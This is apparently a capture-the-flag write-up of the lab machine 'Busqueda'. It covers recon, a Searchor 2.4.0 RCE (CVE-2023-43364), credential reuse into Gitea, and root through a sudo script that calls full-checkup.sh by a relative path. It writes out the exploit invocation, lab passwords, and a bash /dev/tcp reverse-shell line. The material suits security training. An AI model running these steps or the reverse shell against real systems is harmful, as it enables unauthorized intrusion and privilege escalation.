Busqueda

Target IP: 10.129.208.113
Challenge Description: N/A.

Reconnaissance


Performing a port scan using the command sudo nmap -sS 10.129.208.113 -p- returns the result shown above. According to the scan, there are two TCP ports open on the target machine: SSH and HTTP on their standard ports. Time to perform an aggressive port scan to identify its services.


I executed the command sudo nmap -sV -A 10.129.208.113 -p 22,80 and obtained the result shown above. According to the HTTP scan, the hostname is searcher.htb. I will need to insert this hostname inside my /etc/hosts file.


I inserted the entry 10.129.208.113 searcher.htb inside my /etc/hosts file, as shown above. Time to perform enumeration now. I performed a subdomain enumeration, but I did not find anything useful.

Enumeration

Port 80: HTTP

The webpage above is displayed for this web application. This web application is pretty cool. It allows me to pick the different search engines and search for anything. There is also a checkbox which allows auto-redirect to the searched term. Right away, I notice the string Powered by Flask and Searchor 2.4.0 at the footer of the website. This web application is built using Python and it is using the module Searchor 2.4.0. What version is this Python? And is Searchor 2.4.0 vulnerable?


To identify the Python version used by the web application, I used whatweb with the command whatweb http://searcher.htb. And bingo! It seems to be using Python 3.10.6, as shown above. Is the web application using out-of-date packages?

Exploitation


I searched for Searchor 2.4.0 vulnerability and found the website shown above. It looks like this module is vulnerable to RCE. This vulnerability has the CVE id of CVE-2023-43364.


Searching for CVE-2023-43364 exploits, I found the Github repository shown above. The link to this repository is located here.This exploit seems to work against the application version the target machine is running, as it's less than 2.4.2.


I made a copy of the exploit script on my machine with the name exp.sh, as shown above. Time to test it now :)


And bingo! In the image above, there are two terminals: top one to run the exploit, and the bottom one to catch the reverse shell connection. I changed the permission of the script to be executable. I started a listener on my machine at port 8443. To run the exploit, I used the command ./exp.sh http://searcher.htb 10.10.14.139 8443. Then I obtained a reverse shell connection with the session as svc, as shown above. Now I have a foothold on the target machine with the session as svc.

Privilege Escalation


After landing a shell on the target machine, I executed the command ls -la and found the Github directory. Inside this directory, I notice the config file is located there. I ran the command cat on it and obtained a crucial information. The entry url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git is critical, as it contains two crucial information: the target machine is running Gitea at gitea.searcher.htb, and the credentials cody:jh1usoih2bkjaspwe92 is also available. Time to add this new hostname inside my /etc/hosts file and browse to http://gitea.searcher.htb.


Bingo! The Gitea application is shown above. It is accessible after I browse to http://gitea.searcher.htb. Time to test the credentials cody:jh1usoih2bkjaspwe92 and try to login as the user cody.


I pressed the Sign In button from the previous image. Then I used the credentials cody:jh1usoih2bkjaspwe92 to login and ...


It worked. Now I have access to the Gitea application as the user cody as shown above. However, I notice this user is not an administrator. However, I notice creating a new repository fails. One possible attack vector would have been is to use hooks to obtain a higher privilege shell, but this is not possible. Back to square one.


Running sudo -l and the password jh1usoih2bkjaspwe92, I notice the entry: /usr/bin/python3 /opt/scripts/system-checkup.py *. The Python script with the name /opt/scripts/system-checkup.py can be executed using /usr/bin/python as root. However, I am unable to read the contents of this file.


I executed the command sudo -u root /usr/bin/python3 /opt/scripts/system-checkup.py * and obtained the result shown above. Running the command shows it takes in another argument. Maybe I can exeucte the command full-checkup? Or even docker-ps to obtain more information about the containers?


I ran the command sudo -u root /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps and obtained the result shown above. I notice there is a mysql database instance running too. Maybe it is possible to obtain the credentials of the user administrator from Gitea?


I executed the command sudo -u root /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format="{{.Config}}" mysql_db and sudo -u root /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format="{{.Config}}" gitea. Running both commands output the password yuiu1hoiu4i5ho1uh. I tried to connect to the mysql instance but I notice the user svc was not allowed to. Maybe I can test this password against the Gitea application with the username administrator?


And bingo! I successfully logged into the Gitea application using the credentials administrator:yuiu1hoiu4i5ho1uh.


Now I have admin access on this application. A repository also exists which contains the scripts! I was unable to read the contents of the script earlier as the user svc. But I now have access to them.


The script with the name system-checkup.py has the unusual code shown above. I notice the command full-checkup automatically executes the script file with the name full-checkup.sh. However, it does not use absolute path; therefore, I can create a malicious script with the name full-checkup.sh and get it to execute to obtain a higher privilege shell.


I browsed to /tmp first. Then I used the commands echo '#!/bin/bash' > full-checkup.sh and echo '/bin/bash -i >& /dev/tcp/10.10.14.139/8444 0>&1' >> full-checkup.sh to insert a reverse shell inside the malicious version of my full-checkup.sh file. Then I changed the permission of the file to be executable using the command chmod +x full-checkup.sh. Now I just have to start a listener on my machine at port 8444 and then execute the command sudo -u root /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup to obtain a higher privileged shell on port 8444.


And bingo! Now I have a root shell. In the image above, there are two terminals. The terminal on top is where I deploy the command sudo -u root /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup. The terminal on bottom is where I catch the reverse shell connection on port 8444. Now I have full access over the target machine :) GG.
